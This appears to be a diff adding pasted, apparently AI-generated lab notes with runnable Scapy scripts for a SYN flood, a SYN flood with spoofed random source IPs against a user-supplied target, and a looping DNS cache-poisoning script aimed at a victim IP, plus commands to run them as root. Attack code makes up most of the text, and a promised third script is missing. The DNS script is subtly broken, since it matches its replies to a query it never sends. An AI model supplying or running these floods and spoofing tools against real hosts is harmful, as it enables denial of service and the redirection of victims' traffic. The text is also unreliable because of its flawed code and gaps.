@@ -1,0 +1,295 @@
+ Step 1: Install Python and Scapy
+Open your Ubuntu terminal and run:
+
+bash
+
+Copy
+
+Edit
+sudo apt update
+sudo apt install python3-pip -y
+sudo pip3 install scapy
+
+
+
+ Step 2: Use 127.0.0.1 as Target (Your Own PC)
+Since you only have 1 PC, use this:
+
+Target IP: 127.0.0.1 (this is your own machine)
+
+Source IP: any fake IP (e.g., 192.168.1.100 or random)
+
+Source port: any number between 1024 and 65535 (like 12345)
+
+Target port: Use 80 (HTTP port)
+
+You don’t need real IPs here, since you’re attacking your own system.
+
+
+
+📝 Step 3: Create 3 Scripts (1 for each attack)
+▶️ Attack 1: SYN Flood with Your Own IP
+Create the script:
+
+bash
+
+Copy
+
+Edit
+nano attack1_basic_syn.py
+Paste this code:
+
+python
+
+Copy
+
+Edit
+from scapy.all import *
+
+source_IP = "127.0.0.1"
+target_IP = "127.0.0.1"
+source_port = 12345
+
+i = 1
+while True:
+    pkt = IP(src=source_IP, dst=target_IP) / TCP(sport=source_port, dport=80, flags="S")
+    send(pkt, inter=0.001, verbose=0)
+    print("Packet sent", i)
+    i += 1
+Save it: Press CTRL+X, then Y, then Enter.
+
+▶️ Attack 2: SYN Flood with Spoofed Random IPs
+Create:
+
+bash
+
+Copy
+
+Edit
+nano attack2_random_ip.py
+Paste:
+
+python
+
+Copy
+
+Edit
+from scapy.all import IP, TCP, RandIP, send
+
+# Take target IP and source port as input
+target_IP = input("Enter IP address of Target: ")
+source_port = int(input("Enter Source Port Number: "))
+
+# Counter for packets sent
+i = 1
+
+# Infinite loop to send spoofed SYN packets
+while True:
+    # Generate a random spoofed IP address
+    spoofed_IP = RandIP()
+
+    # Create IP and TCP headers
+    ip_layer = IP(src=spoofed_IP, dst=target_IP)
+    tcp_layer = TCP(sport=source_port, dport=80, flags="S")
+
+    # Combine layers
+    packet = ip_layer / tcp_layer
+
+    # Send the packet
+    send(packet, inter=0.001, verbose=0)
+
+    # Display progress
+    print(f"[{i}] Packet sent from spoofed IP: {spoofed_IP} to {target_IP}:80")
+    i += 1
+
+Save it (CTRL+X, Y, Enter).
+
+
+
+
+
+
+🧪 Step 4: Run Each Script
+You must use sudo to send packets.
+
+🔹 To run Attack 1:
+bash
+
+Copy
+
+Edit
+sudo python3 attack1_basic_syn.py
+🔹 To run Attack 2:
+bash
+
+Copy
+
+Edit
+sudo python3 attack2_random_ip.py
+🔹 To run Attack 3:
+bash
+
+Copy
+
+Edit
+sudo python3 attack3_single_spoof.py
+
+
+Enter IP address of Source: 127.0.0.1
+Enter IP address of Target: 127.0.0.1
+Enter Source Port Number: 12345
+
+
+
+ Step 5: Observe the Packets
+You can observe your machine receiving SYN packets like this:
+
+bash
+
+Copy
+
+Edit
+sudo netstat -ant | grep :80
+Or install and use Wireshark:
+
+bash
+
+Copy
+
+Edit
+sudo apt install wireshark -y
+sudo wireshark
+Start capture on lo interface and filter with tcp.port == 80.
+
+
+
+
+
+
+
+
+
+
+#######DNS########
+
+DNS Spoofing, also known as DNS Cache Poisoning, involves sending false DNS responses to a victim to mislead them into connecting to malicious websites instead of legitimate ones. Below is a basic example of how DNS Spoofing can be implemented using **Scapy** in Python.
+
+### DNS Spoofing Code Example
+
+Here’s a simple Python script that performs **DNS Spoofing** (Cache Poisoning) using Scapy. The attacker sends a fake DNS response to the target machine, redirecting them to a different IP.
+
+#### **Prerequisites**:
+
+* You must run this code as `root` (administrator) on your Ubuntu machine to access raw sockets.
+* Install `Scapy` using `sudo apt install python3-scapy`.
+
+#### **Code**:
+
+```python
+from scapy.all import *
+import random
+import time
+
+# Specify the target's IP address
+target_ip = "192.168.1.10"  # Target victim's IP
+target_dns = "192.168.1.1"  # IP of the DNS server you want to spoof
+
+# The domain you want to spoof
+target_domain = "www.example.com"
+
+# Fake IP address to redirect the victim to (can be any IP)
+fake_ip = "203.0.113.5"
+
+def spoof_dns():
+    # DNS Query packet (The victim is asking for www.example.com)
+    dns_query = IP(src=target_ip, dst=target_dns) / UDP(sport=53, dport=53) / DNS(rd=1, qd=DNSQR(qname=target_domain))
+    
+    # Send fake DNS response to the victim with the fake IP for www.example.com
+    dns_response = IP(src=target_dns, dst=target_ip) / UDP(sport=53, dport=53) / DNS(
+        id=dns_query[DNS].id, 
+        qr=1, 
+        aa=1, 
+        qd=dns_query[DNSQR], 
+        an=DNSRR(rrname=target_domain, rdata=fake_ip, ttl=60)
+    )
+    
+    # Send the spoofed DNS response
+    send(dns_response, verbose=0)
+    print(f"Sent fake DNS response to {target_ip} redirecting {target_domain} to {fake_ip}")
+
+# Run the spoofing in a loop
+try:
+    while True:
+        spoof_dns()
+        time.sleep(1)  # Send a spoofed DNS response every second
+except KeyboardInterrupt:
+    print("Attack stopped.")
+```
+
+### **How the Code Works**:
+
+1. **Target and DNS Setup**:
+
+   * `target_ip`: The victim’s machine IP.
+   * `target_dns`: The IP address of the DNS server the victim is using (typically the gateway/router or DNS server).
+
+2. **Domain and Fake IP**:
+
+   * `target_domain`: The domain name you want to spoof (e.g., `www.example.com`).
+   * `fake_ip`: The IP address you want the victim to resolve the domain to (this could be any IP, e.g., a malicious website).
+
+3. **DNS Query Packet**:
+
+   * This creates a DNS query packet that mimics the victim requesting the domain (`www.example.com`).
+
+4. **DNS Response Packet**:
+
+   * This sends a **spoofed DNS response** to the victim, redirecting `www.example.com` to a fake IP (e.g., `203.0.113.5`).
+
+5. **Loop**:
+
+   * The `while` loop sends spoofed DNS responses to the victim every second to keep poisoning their DNS cache.
+
+### **Running the Code**:
+
+1. **Step 1: Open your terminal**:
+
+   * Press `Ctrl + Alt + T` to open your terminal.
+
+2. **Step 2: Install Scapy** (if not already installed):
+
+   ```bash
+   sudo apt update
+   sudo apt install python3-scapy
+   ```
+
+3. **Step 3: Save the code** into a Python file, e.g., `dns_spoofing.py`.
+
+4. **Step 4: Run the script**:
+
+   * Run the script with root privileges to use raw sockets.
+
+   ```bash
+   sudo python3 dns_spoofing.py
+   ```
+
+   * You should see output similar to:
+
+     ```text
+     Sent fake DNS response to 192.168.1.10 redirecting www.example.com to 203.0.113.5
+     ```
+
+   * The attacker (your machine) is now sending fake DNS responses to the victim (target machine), poisoning their DNS cache.
+
+5. **Step 5: To stop the attack**:
+
+   * Press `Ctrl + C` to stop the attack.
+
+### **Important Notes**:
+
+* **Legal and Ethical Use**: Only perform DNS spoofing in a controlled environment where you have permission, such as a personal lab or with explicit consent for educational purposes. Attacking systems or networks without authorization is illegal.
+* **Target Network**: Ensure you're testing this on your own network or a sandbox environment. Never spoof DNS for targets without their consent.
+* **Detection**: DNS Spoofing can be difficult to detect immediately. Some mitigation techniques involve using DNSSEC (DNS Security Extensions) or monitoring unusual DNS traffic.
+
+If you have any further questions or need additional assistance with the process, feel free to ask!
+
